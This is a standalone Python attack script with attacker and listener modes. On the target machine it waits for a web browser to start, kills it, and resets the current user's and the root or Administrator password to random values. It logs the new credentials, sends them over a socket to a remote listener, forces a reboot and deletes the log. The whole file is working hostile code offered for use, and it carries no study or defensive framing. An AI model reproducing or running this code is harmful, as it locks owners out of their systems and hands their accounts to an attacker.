import subprocess
import sys
import os
import time
import getpass
import socket
import string
import random
import platform
import requests
import re
from bs4 import BeautifulSoup

# --- CONFIGURATION ---
TARGET_IP_ADDRESS = ""
TARGET_PORT = 12345
LOG_FILE = "new_credentials.txt"
LISTENER_MODE = False
RECEIVED_CREDENTIALS_FILE = "/tmp/received_credentials.txt" if not sys.platform.startswith("win") else "received_credentials.txt"


# --- UTILITY FUNCTIONS ---

def change_user_credentials(new_password="today", target_username=None):
    """
    Changes the password of a specified user.
    Handles different operating systems. Requires appropriate privileges.
    """
    try:
        if sys.platform.startswith("linux"):
            effective_username = target_username if target_username else getpass.getuser()
            command = ['passwd', effective_username]
            process = subprocess.Popen(command,
                                        stdin=subprocess.PIPE,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        text=True)
            stdout, stderr = process.communicate(input=f"{new_password}\n{new_password}\n")
            result = process.returncode
            if result == 0:
                print(f"Password for user '{effective_username}' changed successfully.")
                return 0
            else:
                print(f"Error: Password change failed for user '{effective_username}'. Error Code: {result} Stderr: {stderr}", file=sys.stderr)
                return result
        elif sys.platform.startswith("win"):
            effective_username = target_username if target_username else getpass.getuser()
            print(f"Attempting to change password for user: {effective_username}")
            command = ["net", "user", effective_username, new_password]
            process = subprocess.Popen(command,
                                        stdin=subprocess.PIPE,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        text=True)
            stdout, stderr = process.communicate()
            result = process.returncode
            if result == 0:
                print(f"Password for user '{effective_username}' changed successfully.")
                return 0
            else:
                print(f"Error: Password change failed for user '{effective_username}'. Error Code: {result} Stderr: {stderr}", file=sys.stderr)
                return result
        elif sys.platform.startswith("darwin"):
            effective_username = target_username if target_username else getpass.getuser()
            print(
                f"Attempting to change password for user: {effective_username} on macOS (requires administrator privileges).")
            command = ["dscl", ".", "-passwd", "/Users/" + effective_username, new_password]
            process = subprocess.Popen(command,
                                        stdin=subprocess.PIPE,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        text=True)
            stdout, stderr = process.communicate(input=f"{new_password}\n")
            result = process.returncode
            if result == 0:
                print(f"Password change attempted successfully for user '{effective_username}' (may require subsequent authentication).")
                return 0
            else:
                if "Authentication server refused operation" in stderr:
                    print(f"Error: Password change failed on macOS for user '{effective_username}'. Authentication server refused operation. This usually means the operation requires administrator privileges and was not authorized.", file=sys.stderr)
                else:
                    print(f"Error: Password change failed on macOS for user '{effective_username}'. Error Code: {result} Stderr: {stderr}", file=sys.stderr)
                return result
        else:
            print("Operating system not supported for password change.", file=sys.stderr)
            return 1
    except FileNotFoundError:
        print("Error: The 'passwd', 'tasklist', 'pgrep', 'net' or 'dscl' command was not found.", file=sys.stderr)
        return 127
    except Exception as e:
        print(f"An unexpected error occurred during password change: {e}", file=sys.stderr)
        return 1


def is_process_running(process_name):
    """Checks if a specific process is running (OS-dependent)."""
    try:
        if sys.platform.startswith('win'):
            process = subprocess.Popen(['tasklist', '/FI', f'IMAGENAME eq {process_name}'],
                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, _ = process.communicate()
            return process_name.encode() in stdout
        elif sys.platform.startswith('linux'):
            process = subprocess.Popen(['pgrep', process_name],
                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, _ = process.communicate()
            return len(stdout) > 0
        elif sys.platform.startswith('darwin'):
            process = subprocess.Popen(['pgrep', process_name],
                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, _ = process.communicate()
            return len(stdout) > 0
        else:
            print(f"Warning: OS not fully supported for checking process: {process_name}")
            return False
    except Exception as e:
        print(f"Error checking for process {process_name}: {e}")
        return False

def is_any_browser_installed():
    """Checks if any common web browser is installed by scanning common paths."""
    browser_app_names_darwin = ["Opera.app", "Google Chrome.app", "Firefox.app", "Safari.app"]
    browser_executables_linux = ["opera", "chromium", "firefox", "google-chrome"]
    browser_executables_windows = ["opera.exe", "chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe"]
    system = platform.system()

    if system == "Darwin":
        for app_name in browser_app_names_darwin:
            app_path = os.path.join("/Applications", app_name)
            if os.path.exists(app_path):
                print(f"Found potential browser installation: {app_path}")
                return True
        for path in ["/usr/bin", "/usr/local/bin"]:
            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.lower() in [name.lower().replace(".app", "") for name in browser_app_names_darwin] or file.lower() in browser_executables_linux:
                        print(f"Found potential browser executable: {os.path.join(path, file)}")
                        return True
    elif system == "Linux":
        for path in ["/usr/bin", "/usr/local/bin", "/opt/google/chrome", "/opt/mozilla"]:
            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.lower() in browser_executables_linux:
                        print(f"Found potential browser installation: {os.path.join(path, file)}")
                        return True
    elif system == "Windows":
        for program_files in ["C:\\Program Files", "C:\\Program Files (x86)"]:
            if os.path.exists(program_files):
                for root, _, files in os.walk(program_files):
                    for file in files:
                        if file.lower() in browser_executables_windows:
                            print(f"Found potential browser installation: {os.path.join(root, file)}")
                            return True
        for app_data in [os.path.expanduser("~\\AppData\\Local"), os.path.expanduser("~\\AppData\\Roaming")]:
            if os.path.exists(app_data):
                for root, _, files in os.walk(app_data):
                    for file in files:
                        if file.lower() in browser_executables_windows:
                            print(f"Found potential browser installation: {os.path.join(root, file)}")
                            return True
    return False

def wait_for_browser_running():
    """Waits until any common web browser starts running."""
    browser_processes = ["opera.exe", "chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe",
                           "opera", "chromium", "firefox", "google-chrome",
                           "firefox-bin", # Add this for some Firefox installations
                           "chromium-browser", # Add this for some Chromium installations
                           "brave-browser", # Example for Brave
                           "epiphany-browser", # Example for GNOME Web
                           "surf", # Example for Surf
                           "qutebrowser", # Example for Qutebrowser
                           "Opera.app", "Google Chrome.app",
                           "Firefox.app", "Safari.app"]
    print("Waiting for any browser to start...")
    while True:
        for process in browser_processes:
            process_to_check = process.replace(".app", "") if sys.platform.startswith('darwin') else process
            if is_process_running(process_to_check):
                print(f"Browser detected running: {process}")
                return process
        time.sleep(5)

def kill_browser(browser_process_name):
    """Kills a specific running browser process (OS-dependent)."""
    try:
        print(f"Killing {browser_process_name} processes...")
        if sys.platform.startswith('win'):
            subprocess.run(['taskkill', '/F', '/IM', browser_process_name],
                             check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif sys.platform.startswith('linux'):
            subprocess.run(['killall', '-q', browser_process_name],
                             check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif sys.platform.startswith('darwin'):
            # Kill by bundle identifier for .app
            if ".app" in browser_process_name:
                bundle_id = browser_process_name.replace(".app", "").lower().replace(" ", "")
                subprocess.run(['killall', '-q', bundle_id],
                                 check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            else:
                subprocess.run(['killall', '-q', browser_process_name],
                                 check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            print(f"Warning: OS not fully supported for killing {browser_process_name}.")
            return
        time.sleep(2)
        print(f"{browser_process_name} processes killed (attempted).")
    except subprocess.CalledProcessError as e:
        print(f"Error killing {browser_process_name}: {e}")




def shutdown_computer():
    """Shuts down the computer (OS-dependent, requires admin/root privileges)."""
    try:
        print("Shutting down the computer...")
        if sys.platform.startswith('win'):
            subprocess.run(['shutdown', '/s', '/f'],
                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif sys.platform.startswith('linux'):
            subprocess.run(['shutdown', '-h', 'now'],
                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif sys.platform.startswith('darwin'):
            subprocess.run(['shutdown', '-h', 'now'],
                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            print("Warning: OS not fully supported for shutdown.")
            return
        print("Shutdown command executed.")
    except subprocess.CalledProcessError as e:
        print(f"Error shutting down: {e}")


def generate_random_string(length=12):
    """Generates a random string."""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))


def log_all_credentials(credentials_dict, log_file):
    """Logs the usernames and passwords to a text file."""
    try:
        with open(log_file, "w") as f:
            for user, password in credentials_dict.items():
                f.write(f"New Password for {user}: {password}\n")
        print(f"Credentials logged to: {log_file}")
        return True
    except Exception as e:
        print(f"Error logging credentials: {e}")
        return False


def listener_main():
    """Main function for the listening machine."""
    HOST = '0.0.0.0'  # Listen on all interfaces
    PORT = TARGET_PORT
    received_file_path = RECEIVED_CREDENTIALS_FILE

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, PORT))
            s.listen()
            print(f"Listening on port {PORT}...")
            conn, addr = s.accept()
            with conn:
                print(f"Connected by {addr}")
                with open(received_file_path, 'wb') as f:
                    while True:
                        data = conn.recv(1024)
                        if not data:
                            break
                        f.write(data)
                print(f"Credentials received and saved to {received_file_path}")
    except KeyboardInterrupt:
        print("\nListener interrupted.")
    except Exception as e:
        print(f"An error occurred in the listener: {e}")
    finally:
        if 's' in locals() and s.fileno() != -1:
            s.close()

def get_current_username():
    """Gets the current username based on the OS, handling sudo."""
    if sys.platform.startswith("win"):
        return os.environ.get("USERNAME")
    elif sys.platform.startswith("linux") or sys.platform.startswith("darwin"):
        if 'SUDO_USER' in os.environ:
            return os.environ['SUDO_USER']
        elif 'USER' in os.environ:
            return os.environ['USER']
        else:
            return getpass.getuser()
    else:
        return None


def attacker_main():
    """Main function for the attacking machine (now the target machine)."""
    if sys.platform.startswith("linux") and os.geteuid() != 0:
        print("Error: This script requires root privileges (sudo) on Linux to change passwords.")
        return

    if sys.platform.startswith("win"):
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("Error: This script requires administrator privileges on Windows to change passwords.")
            return
    elif sys.platform.startswith("darwin"):
        # Check if the user is an admin (needs more robust checking)
        if os.geteuid() != 0:
            print("Warning: Changing password on macOS might require administrator privileges (run with sudo).")

    print("And it begins :P")

    if is_any_browser_installed():
        print("At least one browser is installed. Waiting for a browser to run...")
        running_browser = wait_for_browser_running()
        if running_browser:
            kill_browser(running_browser)
            new_password_user = generate_random_string(12)  # Generate a new random password
            standard_user = get_current_username()  # Get the standard user's username
            new_password_root = generate_random_string(12)  # Generate a new random password

            print(f"Attempting to change password for user: {standard_user}")
            password_changed_user = change_user_credentials(new_password_user, standard_user)

            password_changed_root = -1  # Initialize to a non-success value
            root_user = "root"
            admin_user = "Administrator" # Define admin_user here for consistency

            if sys.platform.startswith("linux"):
                print(f"Attempting to change password for user: {root_user}")
                password_changed_root = change_user_credentials(new_password_root, root_user)
            elif sys.platform.startswith("win"):
                print(f"Attempting to change password for user: {admin_user}")
                password_changed_root = change_user_credentials(new_password_root, admin_user)
            elif sys.platform.startswith("darwin"):
                print(f"Attempting to change password for user: {root_user}")
                password_changed_root = change_user_credentials(new_password_root, root_user)

            if password_changed_user == 0 and password_changed_root == 0:
                print(
                    f"Passwords for user '{standard_user}' and administrator ('{root_user if sys.platform.startswith('linux') or sys.platform.startswith('darwin') else 'Administrator'}') changed successfully (or attempted). Proceeding to log and restart.")
                all_credentials = {standard_user: new_password_user}  # Start with the standard user
                if sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
                    all_credentials[root_user] = new_password_root  # Add root user
                elif sys.platform.startswith('win'):
                    all_credentials["Administrator"] = new_password_root  # Add Administrator user
                if log_all_credentials(all_credentials, LOG_FILE):
                    target_ip_listener = TARGET_IP_ADDRESS
                    target_port = TARGET_PORT
                    credentials_file = LOG_FILE

                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.connect((target_ip_listener, target_port))
                            with open(credentials_file, 'rb') as f:
                                while True:
                                    data = f.read(1024)
                                    if not data:
                                        break
                                    s.sendall(data)
                        print(f"Credentials file '{credentials_file}' sent to {target_ip_listener}:{target_port}")
                    except ConnectionRefusedError:
                        print(
                            f"Error: Connection to {target_ip_listener}:{target_port} refused. Ensure the listener is running and the port is open.")
                    except Exception as e:
                        print(f"An error occurred while sending: {e}")
                    finally:
                        try:
                            print("Restarting the computer...")
                            if sys.platform.startswith('win'):
                                subprocess.run(['shutdown', '/r', '/f'], check=True, stdout=subprocess.PIPE,
                                                 stderr=subprocess.PIPE)
                            elif sys.platform.startswith('linux'):
                                subprocess.run(['shutdown', '-r', 'now'], check=True, stdout=subprocess.PIPE,
                                                 stderr=subprocess.PIPE)
                            elif sys.platform.startswith('darwin'):
                                subprocess.run(['shutdown', '-r', 'now'], check=True, stdout=subprocess.PIPE,
                                                 stderr=subprocess.PIPE)
                            else:
                                print("Warning: OS not fully supported for restart.")
                        except subprocess.CalledProcessError as e:
                            print(f"Error restarting: {e}")

                        try:
                            os.remove(credentials_file)
                            print(f"Log file '{credentials_file}' removed.")
                        except Exception as e:
                            print(f"Error removing log file: {e}")
                else:
                    print("Failed to log all credentials. Restart aborted.")
            else:
                print(
                    f"Failed to change password for either the current user ('{standard_user}') or administrator ('{root_user if sys.platform.startswith('linux') or sys.platform.startswith('darwin') else 'Administrator'}'). Restart aborted.")
        else:
            print("No browser was detected running.")
    else:
        print("No common web browser seems to be installed. Skipping browser-related actions.")






def log_all_credentials(credentials_dict, log_file):
    """Logs the usernames and passwords to a text file."""
    try:
        with open(log_file, "w") as f:
            for user, password in credentials_dict.items():
                f.write(f"New Password for {user}: {password}\n")
        print(f"Credentials logged to: {log_file}")
        return True
    except Exception as e:
        print(f"Error logging credentials: {e}")
        return False

if __name__ == "__main__":
    if LISTENER_MODE:
        print(f"Running as listener on {sys.platform}...")
        listener_main()
    else:
        print(f"Running as attacker on {sys.platform}...")
        # Get the standard user's name *before* elevating (if necessary)
        standard_user = getpass.getuser()
        attacker_main()